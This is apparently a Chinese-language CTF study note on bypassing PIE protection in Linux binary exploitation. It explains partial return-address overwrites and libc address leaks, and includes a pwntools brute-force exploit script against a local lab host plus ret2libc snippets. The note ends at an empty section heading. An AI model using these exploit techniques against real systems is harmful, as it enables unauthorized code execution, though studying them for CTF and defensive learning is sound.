## 保护介绍：
PIE 保护就是通过一些设置，使得我们每一次打开我们的程序文件时，我们的程序文件对应的都是不一样的。这个是针对我们的代码段，和我们的数据段，bss 段的一种保护措施。应用了 PIE 的程序会在每次加载时都变换加载的基地址。
我们可以把我们的 PIE 理解为一种特殊的 libc 来处理即可。
与之相对的是我们的 ASLR 技术，这种技术

![[Pasted image 20240119145603.png]]



## 对 PIE 进行调试
```
b *rebase(0x1234)
```


## 部分修改绕过
原理：因为内存的页载入机制，PIE 的随机化只会影响到我们的单个内存页。通常来说，一个内存页大小为 `0x1000`,这就意味着不管地址怎么变，某条指令的后 12 位，3 个 16 进制数的地址是始终不变的。
因此通过覆盖 EIP 的后 8 或 16 位，就可以快速爆破或者直接劫持 EIP。

这里，我们需要现在我们的静态文件中找到我们的对应的末三位是多少，然后我们覆盖我们的地址是，注意**只用覆盖我们的末三位就能实现我们的功能了**。

步骤一：找到我们后门函数的后三位是多少
步骤二：构造我们的 payload ，使得我们的返回地址是我们的后门函数。

```python
from pwn import *
context.update(arch = 'amd64', os = 'linux')
i = 0
while True:
i += 1
print i
io = remote("172.17.0.3", 10001)
io.recv()
payload = 'a'*40 #padding
payload += '\xca' #修改长度为202，即payload的长
度，这个参数会在其后的strncpy被使用
io.sendline(payload)
io.recv()
payload = 'a'*200 #padding
payload += '\x01\xa9' #frontdoor的地址后三位是0x900, +1
跳过push rbp
io.sendline(payload)
io.recv()
try:
io.recv(timeout = 1) #要么崩溃要么爆破成功，若崩溃io会
关闭，io.recv()会触发EOFError
except EOFError:
io.close()
continue
else:
sleep(0.1)
```

## 内存泄漏法绕过
对于我们的这种一般的方法，我们的思路都是：通过我们的栈溢出或者我们的 printf 函数来**泄漏我们的部分信息**。

这里，我们可以根据我们需要泄露的信息与我们的原地址的大小之间的差来进行分类：
1. 如果地址的差距只限于我们的两个字节：
我们就可以通过我们的前面的部分修改法来绕过我们的目标位置。这里，我们一般可以考虑从我们的**寄存器中找我们需要泄露的信息**。这里是因为，我们如果使用的是一个 [[格式化字符串]] 漏洞的话，他就会打印我们的**寄存器中的信息**。而在这里，我们的修改可以认为是修改了我们的 PC 的地址。

一般来说，如果一个地址是我们的 libc 的的地址，那么他的末尾一定会有我们的：`__libc_start_call_main` 这样的字段或者说以我们的以我们的红色字结尾。





```python
payload=b'a'*10+p8(0x57)
libc_base=l64()-libc.sym['func']
system,binsh=get_sb()
```

2. 如果地址的差距大于我们的两个字节：
我们就需要通过我们的暴力破解法或者我们的其他方法来泄露我们的地址。例如：；
```cpp
0x000055da62bld266
0x000055da62bldlf5
```
当中，我们有三位有变化，而我们如果要修改，只能修改我们的 2 的倍数次，于是我们就需要通过我们的爆破来获得我们的最高位应该修改为多少。而我们修改的位置，我们可以**理解为修改了我们的一个 `PC` 的数据**。

泄露完成后，我们还需要去执行我们的漏洞函数，以再次使用我们的漏洞。

第二步：正常执行我们的 systemcall 或者 retlibc 即可
**如果我们需要用到我们的 rop 链，我们的地址应该从我们的 libc 文件中去找，不能从我们的原文件中去找**


## 爆破地址法